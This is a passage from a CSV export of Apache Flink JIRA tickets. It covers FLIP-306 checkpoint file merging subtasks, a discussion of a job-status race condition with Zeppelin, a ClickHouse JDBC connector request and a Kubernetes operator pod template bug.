<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,masteryhx,zakelly,zakelly,13/May/23 04:40,14/Mar/24 05:42,04/Jun/24 20:41,14/Mar/24 05:42,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Mar 14 05:42:27 UTC 2024,,,,,,,,,,"0|z1hvcg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Mar/24 05:42;masteryhx;merged 583722e7 and 3b9623e5 into master;;;",,,,,,,,,,,,,,,,,,,,,,
Delete merged files on checkpoint abort or subsumption,FLINK-32075,13536042,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zakelly,zakelly,zakelly,13/May/23 04:40,04/Mar/24 12:10,04/Jun/24 20:41,04/Mar/24 12:10,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Mar 04 12:10:28 UTC 2024,,,,,,,,,,"0|z1hvc8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"04/Mar/24 12:10;masteryhx;merged cd9a9f76 into master.;;;",,,,,,,,,,,,,,,,,,,,,,
Support file merging across checkpoints,FLINK-32074,13536041,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zakelly,zakelly,zakelly,13/May/23 04:39,18/Mar/24 02:27,04/Jun/24 20:41,18/Mar/24 02:26,1.18.0,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Mar 18 02:26:48 UTC 2024,,,,,,,,,,"0|z1hvc0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/Mar/24 02:26;masteryhx;Merged 841f23c7 into master;;;",,,,,,,,,,,,,,,,,,,,,,
Implement file merging in snapshot,FLINK-32073,13536040,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,AlexYinHan,zakelly,zakelly,13/May/23 04:38,22/Jan/24 14:04,04/Jun/24 20:41,22/Jan/24 14:04,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jan 22 14:03:43 UTC 2024,,,,,,,,,,"0|z1hvbs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Jan/24 14:03;ym;merged commit [{{f9f9299}}|https://github.com/apache/flink/commit/f9f9299f6e25080c6f869b46ec0bdc5e3e19e00d] into apache:master;;;",,,,,,,,,,,,,,,,,,,,,,
Create and wire FileMergingSnapshotManager with TaskManagerServices,FLINK-32072,13536039,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Yanfei Lei,zakelly,zakelly,13/May/23 04:38,11/Oct/23 03:22,04/Jun/24 20:41,11/Oct/23 03:22,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,stale-assigned,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 11 03:21:51 UTC 2023,,,,,,,,,,"0|z1hvbk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","11/Oct/23 03:21;Yanfei Lei;Merged into master via 1112582fd136df47c6d356d6f6ad3946ad1e56d5;;;",,,,,,,,,,,,,,,,,,,,,
Implement the snapshot manager for merged checkpoint files in TM,FLINK-32071,13536038,13536037,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,zakelly,zakelly,zakelly,13/May/23 04:37,23/Jun/23 16:52,04/Jun/24 20:41,23/Jun/23 16:52,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,,,"As the first part of FLIP-306, which aims to provide an unified file merging mechanism for checkpoint files, this ticket/PR implements the basic file manager for merged files, providing file system directory layout and its initialization. It also provides the implementation of physical and logical files and the reference counting relationship between them.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 23 16:52:07 UTC 2023,,,,,,,,,,"0|z1hvbc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jun/23 16:52;ym;commit [{{01560a1}}|https://github.com/apache/flink/commit/01560a154fba41af4a9354da2588f78ea98089b7] into apache:master;;;",,,,,,,,,,,,,,,,,,,,,,
FLIP-306 Unified File Merging Mechanism for Checkpoints,FLINK-32070,13536037,,New Feature,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,zakelly,zakelly,zakelly,13/May/23 04:36,07/Apr/24 08:59,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,,,,"The FLIP: [https://cwiki.apache.org/confluence/display/FLINK/FLIP-306%3A+Unified+File+Merging+Mechanism+for+Checkpoints]

 

The creation of multiple checkpoint files can lead to a 'file flood' problem, in which a large number of files are written to the checkpoint storage in a short amount of time. This can cause issues in large clusters with high workloads, such as the creation and deletion of many files increasing the amount of file meta modification on DFS, leading to single-machine hotspot issues for meta maintainers (e.g. NameNode in HDFS). Additionally, the performance of object storage (e.g. Amazon S3 and Alibaba OSS) can significantly decrease when listing objects, which is necessary for object name de-duplication before creating an object, further affecting the performance of directory manipulation in the file system's perspective of view (See [hadoop-aws module documentation|https://hadoop.apache.org/docs/stable/hadoop-aws/tools/hadoop-aws/index.html#:~:text=an%20intermediate%20state.-,Warning%20%232%3A%20Directories%20are%20mimicked,-The%20S3A%20clients], section 'Warning #2: Directories are mimicked').

While many solutions have been proposed for individual types of state files (e.g. FLINK-11937 for keyed state (RocksDB) and FLINK-26803 for channel state), the file flood problems from each type of checkpoint file are similar and lack systematic view and solution. Therefore, the goal of this FLIP is to establish a unified file merging mechanism to address the file flood problem during checkpoint creation for all types of state files, including keyed, non-keyed, channel, and changelog state. This will significantly improve the system stability and availability of fault tolerance in Flink.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Apr 07 08:59:17 UTC 2024,,,,,,,,,,"0|z1hvb4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/Jul/23 11:19;knaufk;I will mark this as Won't Do in Flink 1.18 release page and update the fixVersion as it still has many open subtasks.;;;","22/Jan/24 15:46;zakelly;I will speed this up and make it in 1.20.;;;","07/Apr/24 02:04;zhoujira86;[~Zakelly] Hi, we met a problem that FLINK checkpoint has too many sst files will cause great IOPS on HDFS. Can this issue help on that scenario?;;;","07/Apr/24 04:23;zakelly;[~zhoujira86] Yes, this helps the scenario where too many files are created and deleted and the NameNode of HDFS is under high pressure. This feature is not available yet and will be in FLINK 1.20.;;;","07/Apr/24 06:29;zhoujira86;Is there any Branch I can compile to do a POC? And I think if you are busy on flink 2.0 state, I can also help do some work on this FLIP-306?[~Zakelly] ;;;","07/Apr/24 07:08;zakelly;[~zhoujira86] The checkpointing part (without restoration part) will work fine after FLINK-34936 merged to master, that's when you can test the merging effect. Actually I'm not that busy and most of the tickets above are not assigned to me. But you are welcomed to contribute if you have some free time. How about start from FLINK-32086 if you are interested.;;;","07/Apr/24 08:59;zhoujira86;[~Zakelly] yes, sounds good, Let me take a look ;;;",,,,,,,,,,,,,,,,
jobClient.getJobStatus() can return status RUNNING for finished insert operation,FLINK-32069,13536003,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,,izeren,izeren,12/May/23 15:16,25/May/23 10:45,04/Jun/24 20:41,25/May/23 10:45,1.15.4,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,,,,"Using zeppelin with remote cluster I came across some race condition issue leading to failed expectations for SQL insert operations. 
 
Below is an example of zeppelin code that is failing because jobClient.getJobStatus() returns running even after job has finished. I have verified that same failover can happen if I use jobClient.getJobExecutionResult().get() (Job execution result is: ""Program execution finished"" but job status is not consistently finished)
{code:java}
TableResult tableResult = ((TableEnvironmentInternal) tbenv).executeInternal(operations);
    checkState(tableResult.getJobClient().isPresent());
    try {
      tableResult.await();
      JobClient jobClient = tableResult.getJobClient().get();
      if (jobClient.getJobStatus().get() == JobStatus.FINISHED) {
        context.out.write(""Insertion successfully.\n"");
      } else {
        throw new IOException(""Job is failed, "" + jobClient.getJobExecutionResult().get().toString());
      }
    } catch (InterruptedException e) {
      throw new IOException(""Flink job is interrupted"", e);
    } catch (ExecutionException e) {
      throw new IOException(""Flink job is failed"", e);
    } {code}
 ZeppelinCode: [https://github.com/apache/zeppelin/blob/master/flink/flink1.15-shims/src/main/java/org/apache/zeppelin/flink/Flink115SqlInterpreter.java#L384]

I suspect that job status is returned based on runningJobsRegistry and since 1.15 this registry is not updated with FINISHED status prior to job result future completion, see this change: {{JobMasterServiceLeadershipRunner.java}} [https://github.com/apache/flink/pull/18189/files#diff-3eb433f18b85c0f5329a4b312a219583189d777fe9bdd547f1114f4a22989f8bL387] 
 
It looks like as race condition that is hard to reproduce on lightweight setup. I was reproducing this running zeppelin notebook with remote flink cluster and triggering SQL insert operation. If I find a smaller setup to reproduce on small local cluster with lightweight client, I will update this ticket when I have more input. I am open to suggestions on how to fix this. 
 
For Zeppelin I have a separate ticket because Flink 1.15 is not going to be fixed but this issue if I understand it correctly should be common for all versions starting 1.15, therefore it makes sense to address this starting 1.16. https://issues.apache.org/jira/browse/ZEPPELIN-5909
 
[~mapohl], Thank you for assistance in slack, I have created this ticket to back our  conversation, could you please add your thoughts on this failure mode?
 
One possible solution would be to have additional check for presence of JobResult in Result store before returning jobStatus (if there is a result, job shouldn't be reported as running based on this documentation: [https://nightlies.apache.org/flink/flink-docs-master/api/java/org/apache/flink/table/api/TableResult.html#await--])",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 10:45:43 UTC 2023,,,,,,,,,,"0|z1hv3k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 18:15;martijnvisser;[~mapohl] Any thoughts?;;;","15/May/23 08:00;mapohl;Thanks for documenting this issue in Jira, [~izeren]. Here are my findings so far:

I struggle to find a connection between the {{RunningJobsRegistry}} and the {{getJobStatus}} call of the client (which calls {{Dispatcher.requestJobStatus}} in the end. [~izeren] is right with claiming that we did a slight modification of the code when removing the {{RunningJobRegistry}} in [JobMasterServiceLeadershipRunner:385ff|https://github.com/apache/flink/commit/01b14fc4b9a9487a144f515bb7d4f6ad14cbe013#diff-3eb433f18b85c0f5329a4b312a219583189d777fe9bdd547f1114f4a22989f8bL385-L395]. Marking this job as done happened before completing the {{JobMasterServiceLeadershipRunner#resultFuture}} through the {{{}RunningJobsRegistry{}}}. In the current code, we mark the job as completed after completing {{JobMasterServiceLeadershipRunner#resultFuture}} through the {{{}JobResultStore{}}}.

My issue is, though, that we're not relying on the {{RunningJobsRegistry}} in any way for the {{Dispatcher#requestJob}} call. The {{RunningJobsRegistry}} was only used for leader recovery in [JobMasterServiceLeadershipRunner.verifyJobSchedulingStatusAndCreateJobMasterServiceProcess:272ff|https://github.com/apache/flink/commit/01b14fc4b9a9487a144f515bb7d4f6ad14cbe013#diff-3eb433f18b85c0f5329a4b312a219583189d777fe9bdd547f1114f4a22989f8bL272-L278] and when submitting a job through [Dispatcher#isInGloballyTerminalState:375ff|https://github.com/apache/flink/pull/18189/files#diff-a4b690fb2c4975d25b05eb4161617af0d704a85ff7b1cad19d3c817c12f1e29cL375] in {{{}Dispatcher#submitJob{}}}. I would have expected that we would find {{Dispatcher#requestJobStatus}} somewhere in the call hierarchy of {{{}RunningJobsRegistry#getJobSchedulingStatus{}}}, if it would have had an influence on {{{}Dispatcher#requestJobStatus{}}}.

I don't want to say that [~izeren]'s conclusion is wrong, yet. It just doesn't match my findings in the code. It could be also that I'm missing a code path here.

[~dmvk], do you have something to add? ;;;","15/May/23 08:01;mapohl;I already mentioned it in Slack and will add the comment for completeness here:

Could it be also related to the {{ResultProvider}} that is used within the {{{}TableResult{}}}? That {{ResultProvider}} seems to depend on the operations that are processed. It is used within the {{TableResult.await()}} that calls [TableResultImpl.awaitInternal(..)|https://github.com/apache/flink/blob/c8e6a6f1dc7b7f61e578aa799ee96d383479a9e4/flink-table/flink-table-api-java/src/main/java/org/apache/flink/table/api/internal/TableResultImpl.java#L93]. The latter one waits for {{ResultProvider.isFirstRowReady}} to return true in [TableResultImpl:105|https://github.com/apache/flink/blob/c8e6a6f1dc7b7f61e578aa799ee96d383479a9e4/flink-table/flink-table-api-java/src/main/java/org/apache/flink/table/api/internal/TableResultImpl.java#L105]. I see three {{ResultProvider}} implementations:
 * {{CollectResultProvider}} waits for all the data to be collected before returning {{true}}
 * {{StaticResultProvider}} returns {{true}} right away
 * But {{InsertResultProvider}} returns {{true}} after the first data is processed (which would, in theory, allow the job to still process data)

{{InsertResultProvider}} was also added in 1.15.;;;","15/May/23 13:56;izeren;I can provide more details on the code path used in my tests:

On zeppelin side of things it goes to:
ClusterClientJobClientAdapter -> RestClusterClient -> getJobStatus -> getJobDetails
getJobDetails is a rest API call to /jobs/:jobid
 
On flink cluster side:
this request is handled by JobOwerviewHandler and processed with Dispatcher::requestMultipleJobDetails
this method requests both info on running and completed jobs 
for completed jobs it relies on ExecutionGraphInfoStore, in my case it is FileExecutionGraphInfoStore::getAvailableJobDetails()
Which is local file jobDetailCache
if I get it right, this cache is updated in Dispatcher::jobReachedTerminalState
 
For job result it goes to /jobs/:jobid/execution-result 
Dispatcher::requestJobResult checks if job is in jobManagerRunnerRegistry and if it is there it returns result future based on job instance in registry, otherwise it picks up result from executionGraphInfoStore (which should be the same as for status)
 
My line of thinking was that job result future is returned based on registry and job status based on result store and it it is not in sync same way as it used to be. 
 
I am not 100% insisting though that bug is there. It can also be in InsertResultProvider. I was originally looking at TableResult impl and I have noticed that ""firstRow"" logic is not new. Also for insert operations you get ""Program execution finished"" when you request result. I would expect job to have status finished in this case (as per documentation). But it is true that this can be on ResultProvider side as well (if it doesn't ensure that job status is finished);;;","15/May/23 15:15;mapohl;Thanks for sharing your train of thought here, [~izeren]. Don't be overwhelmed by the following lines. I'm writing it down for documentation purposes. It would be good if you could verify my findings.
{quote}My line of thinking was that job result future is returned based on registry and job status based on result store and it it is not in sync same way as it used to be.
{quote}
The {{JobManagerRunnerRegistry}} holds the {{JobManagerRunner}} instances. The cleanup of the job is triggered (in [Dispatcher:681|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L681]) as soon as the result of the {{JobManagerRunner}} is completed (which happens in [JobMasterServiceLeadershipRunner#onJobCompletion:384|https://github.com/apache/flink/blob/4882fbd9744d456e09ca60b6c7cf7a5b60326c73/flink-runtime/src/main/java/org/apache/flink/runtime/jobmaster/JobMasterServiceLeadershipRunner.java#L384]). In that moment, {{JobManagerRunnerRegistry}} is the source of truth when it comes to the {{{}JobStatus{}}}. The next step is writing the {{ExecutionGraphInfo}} of the terminated job into the {{ExecutionGraphInfoStore}} in [Dispatcher#jobReachedTerminalState:1334|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L1334]. After that, we create a dirty entry in the {{JobResultStore}} in [Dispatcher#jobReachedTerminalState:1347|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L1347] which runs the operation asynchronously in the {{ioExecutor}} (see [Dispatcher#registerGloballyTerminatedJobInJobResultStore:1365|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L1365]. The future is forwarded to [Dispatcher#runJob:678|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L678] where it will trigger the {{Dispatcher#globalResourceCleaner}} through [Dispatcher#removeJob:1245|https://github.com/apache/flink/blob/ee912b55f9405a41c391f942636b83c6f2c968f3/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/Dispatcher.java#L1245].

We have the job's status stored in the {{{}JobManagerRunnerRegistry{}}}, the {{{}ExecutionGraphInforStore{}}}, and the {{JobResultStore}} persisted based on the same {{{}ExecutionGraph{}}}. Any job status call should rely on the {{{}JobManagerRunnerRegistry{}}}, still.

The {{Dispatcher#globalResourceCleaner}} is configured in [DisptacherResourceCleanerFactory#createGlobalResourceClearner:106ff|https://github.com/apache/flink/blob/c5352fc55972420ed5bf1afdfd97834540b1407a/flink-runtime/src/main/java/org/apache/flink/runtime/dispatcher/cleanup/DispatcherResourceCleanerFactory.java#L106]. It removes the job from the {{JobManagerRunnerRegistry}} before cleaning up all the other artifacts. This cleanup procedure is triggered after the {{JobResultStore}} has the job's dirty entry written to disk/memory (and consequently as well, after having the {{ExecutionGraphInfo}} being persisted in the {{{}ExecutionGraphInfoStore{}}}).

The cleanup will result in the job's {{JobManagerRunner}} not being present in the {{{}JobManagerRunnerRegistry{}}}, anymore. The {{Dispatcher}} starts to rely on the {{ExecutionGraphInfoStore}} at that moment which has the same {{JobStatus}} present as the {{{}JobManagerRunnerRegistry{}}}.

From that findings, I would conclude that there is no race condition possible. WDYT?;;;","15/May/23 16:38;izeren;Thanks a lot [~mapohl] for this detailed analysis. I have only one question left around this dispatcher method that is responsible for job status:
{code:java}
@Override
public CompletableFuture<MultipleJobsDetails> requestMultipleJobDetails(Time timeout) {
    List<CompletableFuture<Optional<JobDetails>>> individualOptionalJobDetails =
            queryJobMastersForInformation(
                    jobManagerRunner -> jobManagerRunner.requestJobDetails(timeout));

    CompletableFuture<Collection<Optional<JobDetails>>> optionalCombinedJobDetails =
            FutureUtils.combineAll(individualOptionalJobDetails);

    CompletableFuture<Collection<JobDetails>> combinedJobDetails =
            optionalCombinedJobDetails.thenApply(this::flattenOptionalCollection);

    final Collection<JobDetails> completedJobDetails =
            executionGraphInfoStore.getAvailableJobDetails();

    return combinedJobDetails.thenApply(
            (Collection<JobDetails> runningJobDetails) -> {
                final Map<JobID, JobDetails> deduplicatedJobs = new HashMap<>();

                completedJobDetails.forEach(job -> deduplicatedJobs.put(job.getJobId(), job));
                runningJobDetails.forEach(job -> deduplicatedJobs.put(job.getJobId(), job));

                return new MultipleJobsDetails(new HashSet<>(deduplicatedJobs.values()));
            });
} {code}

I am sorry if this is naive, but I wonder if the following is possible?
1. {{optionalCombinedJobDetails}} contains job status as RUNNING right after we complete future in onJobCompletion
2. in parallel job transitioned to FINISHED state and {{completedJobDetails}} already has correct execution graph with FINISHED state
3. {{combinedJobDetails}} are compiled with both results but {{runningJobDetails}} has priority over {{completedJobDetails}} and overrides.

I will continue to look into this issue on my side, I will try to intercept JM on {{onJobCompletion}} method and in parallel request job status.

If what I think is not possible or not causing the issue, I will pivot and have a look at InsertResultProvider side of things to check if another promise is broken (that insert operation has only one row in result)

;;;","16/May/23 04:57;mapohl;For the client side, I'm not 100% sure whether your call hierarchy is correct. Based on the (master) code, I can find the following call hierarchies for the {{{}jobClient.getJobStatus(){}}}:
 * Client side:
 ** *{{ClusterClientJobClientAdapter.getJobStatus}}* >>> *{{RestClusterClient.getJobStatus}}* >>> *{{RestClusterClient.requestJobStatus}}* >>> *{{GET /jobs/:jobId/status}}*
 * Server side:
 ** *{{JobStatusHandler.handleRequest}}* >>> *{{Dispatcher.requestJobStatus}}*

For the {{jobClient.getJobExecutionResult()}} call, I find the following call hierachy:
 * Client side:
 ** *{{ClusterClientJobClientAdapter.getJobExecutionResult}}* >>> *{{RestClusterClient.requestJobResult}}* >>> *{{RestClusterClient.requestJobResultInternal}}* >>> *{{GET /jobs/:jobId/execution-result}}*
 * Server side:
 ** *{{JobExecutionResultHandler.handleRequest}}* >>> *{{Dispatcher.requestJobStatus}}*

Both call hierarchies end up in {{Dispatcher.requestJobStatus}} which look for the {{JobManagerRunner}} and use {{ExecutionGraphInfoStore}} as a fallback.

Can you provide debug logs of the case? Additionally: Could you share what input (i.e. {{operations}} and {{{}tbenv{}}}) you use in your runs?;;;","16/May/23 05:53;mapohl;Ok, I was too lazy to switch to the 1.15 branch because I assumed that the code didn't change that much (and I wanted to avoid running into compilation issues again locally due to switching branches). But looks like the code did change. I'm going to do the code analysis once more for {{release-1.15.4}} (assuming that that's the version you're using).

{{{}jobClient.getJobStatus{}}}:
 * Client side:
 ** *{{ClusterClientJobClientAdapter.getJobStatus}}* >>> *{{RestClusterClient.getJobStatus}}* >>> *{{RestClusterClient.requestJobStatus}}* >>> *{{RestClusterClient.getJobDetails}}* >>> *{{JobDetailsHeaders}} {{GET /jobs/:jobId}}*
 * Server side:
 ** {{JobDetailsHandler.handleRequest}} is called which relies on the {{ExecutionGraphCache}} instead of accessing the {{Dispatcher}} directly (like it's done in the {{master}} code with {{{}JobStatusHandler{}}})

For {{{}jobClient.getJobExecutionResult(){}}}, I find the following (same as in {{{}master{}}}):
 * Client side:
 ** *{{ClusterClientJobClientAdapter.getJobExecutionResult}}* >>> *{{RestClusterClient.requestJobResult}}* >>> *{{RestClusterClient.requestJobResultInternal}}* >>> *{{JobExecutionResultHeaders}} {{GET /jobs/:jobId/execution-result}}*
 * Server side:
 ** *{{JobExecutionResultHandler.handleRequest}}* >>> *{{Dispatcher.requestJobStatus}}*

I'm missing the path, though, where we use {{{}requestMultipleJobDetails{}}}. Do I have the wrong version of Flink still?;;;","16/May/23 06:27;mapohl;From the 1.15 finding above the issue might be that we're relying on the {{ExecutionGraphCache}} in the {{JobDetailsHandler}} which might have an out-dated version of the {{ExecutionGraph}} when returning the {{JobStatus}}. Does that sound reasonable?

The cache TTL is configurable through [web.refresh-interval|https://nightlies.apache.org/flink/flink-docs-release-1.15/docs/deployment/config/#web-refresh-interval] which is set to 3s by default.

Relying on the cache was removed in 1.16.0 with FLINK-26641. Can you confirm that you've seen this behavior as well in {{1.16.1}}? Because that would mean that my conclusion doesn't hold.;;;","16/May/23 15:05;izeren;{quote}Does that sound reasonable?{quote}
Oh, yes it does, honestly, I am trying to find evidence that being caught for 1.16 and I have realised that I might have been using 1.16 flink shims on zeppelin side but the problem was on flink cluster itself so I ended up with confusion here. 
If this is the case, this jira can be closed as we are not fixing Flink-1.15. I will open PR for zeppelin to account for it in 1.15 then and for newer versions it shouldn't be a problem. 
I am sorry that this led to confusion about 1.16
;;;","16/May/23 15:08;izeren;{quote}I'm missing the path, though, where we use requestMultipleJobDetails. Do I have the wrong version of Flink still?{quote}

From what I saw in debugger, job status request was triggering JobOverview handler that goes through requestMultipleJobDetails path (I had no FlinkDashboard open same time), I assume that this could have been a side effect as well but it seemed to be consistent pattern;;;","17/May/23 06:51;mapohl;No worries. It was a good discussion. Feel free to close the issue if you have everything confirmed. :);;;","25/May/23 10:45;izeren;Closing, this issue as bug was fixed in newer versions of Flink and 1.15 is not supported;;;",,,,,,,,,,
 flink-connector-jdbc support clickhouse,FLINK-32068,13535952,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,leishuiyu,leishuiyu,leishuiyu,12/May/23 10:24,16/Aug/23 11:39,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,pull-request-available,stale-assigned,,"flink sql support clickhouse
 * int batch scene ,the clickhouse  can as source and sink
 * int stream scene ,the clickhouse  as  sink",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Aug 16 11:39:52 UTC 2023,,,,,,,,,,"0|z1hus8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 10:27;leishuiyu;This function can be implemented by me as a PR ？;;;","12/May/23 11:58;martijnvisser;[~leishuiyu] Sure. I've assigned the ticket to you. ;;;","19/May/23 03:25;leishuiyu;the PR is ready,https://github.com/apache/flink-connector-jdbc/pull/49;;;","11/Aug/23 10:34;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","16/Aug/23 11:39;leishuiyu;the Flinker-Connector-JDBC project does not seem to be progressing and has not been updated for more than two months;;;",,,,,,,,,,,,,,,,,,
"When no pod template configured, an invalid null pod template is configured ",FLINK-32067,13535943,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,gyfora,gyfora,gyfora,12/May/23 09:37,12/May/23 12:48,04/Jun/24 20:41,12/May/23 12:48,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.5.0,kubernetes-operator-1.6.0,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"https://issues.apache.org/jira/browse/FLINK-30609 introduced a bug in the podtemplate logic that breaks deployments when no podtemplates are configured.

The basic example doesnt work anymore for example. The reason is that an invalid null object is set as podtemplate when nothing is configured.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 12 12:48:33 UTC 2023,,,,,,,,,,"0|z1huq8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/May/23 12:48;gyfora;main: af8aabf48928804619cfdb6874700b2bf2250a87
release-1.5: f5be73b9e8861fe7134c224d68eabcd10a9ebfd3;;;",,,,,,,,,,,,,,,,,,,,,,
Flink CI service on Azure stops responding to pull requests,FLINK-32066,13535927,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,jingge,Wencong Liu,Wencong Liu,12/May/23 07:22,12/May/23 16:52,04/Jun/24 20:41,12/May/23 16:52,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Build System / Azure Pipelines,,,,0,,,,"As of the time when this issue was created, Flink's CI service on Azure could no longer be triggered by new pull requests.
